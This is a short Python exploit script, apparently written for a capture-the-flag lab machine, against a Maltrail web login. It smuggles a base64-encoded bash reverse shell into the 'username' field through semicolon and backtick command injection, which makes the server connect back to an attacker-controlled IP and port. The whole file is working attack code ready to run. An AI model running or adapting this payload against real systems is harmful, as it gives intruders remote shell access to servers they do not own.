import requests
import base64

def maltrail_request(ip,port,url):

    reverse_shell = f"""bash -c 'exec bash -i >& /dev/tcp/{ip}/{port} 0>&1'"""

    encode_shell = base64.b64encode(reverse_shell.encode()).decode()

    payload = f';`echo {encode_shell} | base64 -d | bash`'

    data = {
        "username": payload
    }

    response = requests.post(f"{url}/login", data=data)

if __name__ == "__main__":

    ip = "10.10.14.15"
    port = 4444
    url = "http://sau.htb:55555/0fhwi18"

    maltrail_request(ip,port,url)
